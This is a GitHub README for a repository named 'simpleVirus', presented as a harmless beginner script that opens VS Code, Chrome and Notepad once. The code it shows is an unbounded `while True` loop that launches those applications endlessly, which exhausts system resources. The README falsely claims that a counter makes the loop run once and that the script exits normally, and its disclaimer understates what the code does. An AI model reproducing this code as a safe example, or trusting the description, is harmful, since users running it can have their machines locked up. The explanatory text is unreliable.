# Simple Process Launcher (Python)

> A simple educational Python script demonstrating how to launch applications on Windows using the `os` module.

## Disclaimer

This project is intended **for educational purposes only**. It demonstrates how Python can execute system commands to start applications on a Windows machine.

The script does **not**:
- Modify or delete files
- Steal data
- Gain persistence
- Replicate itself
- Bypass security software
- Perform any malicious actions

## Features

- Launches Visual Studio Code
- Launches Google Chrome
- Launches Windows Notepad
- Simple and easy-to-read Python code
- Beginner-friendly example

## Requirements

- Python 3.x
- Windows Operating System
- Visual Studio Code installed and available in the system PATH
- Google Chrome installed and available in the system PATH

## Project Structure

```
simpleVirus/
│
├── virus.py
└── README.md
```

## Source Code

```python
import os



while True:
    os.system("start code")
    os.system("start chrome")
    os.system("start notepad")

```

## How It Works

The script uses the Windows `start` command through Python's `os.system()` function.

Each command opens a different application:

- `start code` → Visual Studio Code
- `start chrome` → Google Chrome
- `start notepad` → Windows Notepad

The loop executes only once because the counter is incremented after launching the applications.

## Running the Script

Clone the repository:

```bash
git clone https://github.com/Mr-B1nary/simpleVirus.git
```

Navigate to the project directory:

```bash
cd simpleVirus
```

Run the script:

```bash
python virus.py
```

## Expected Output

Three applications will open:

- Visual Studio Code
- Google Chrome
- Windows Notepad

After opening them, the script exits normally.

## Notes

If a command such as `code` or `chrome` is not recognized, ensure that the corresponding application is installed and its executable is included in your system's PATH environment variable.

## Educational Purpose

This repository is designed for beginners learning:

- Python
- The `os` module
- Executing system commands
- Windows command-line basics

## License

This project is released under the MIT License.

## Author

**Mr-B1nary**

GitHub: https://github.com/Mr-B1nary
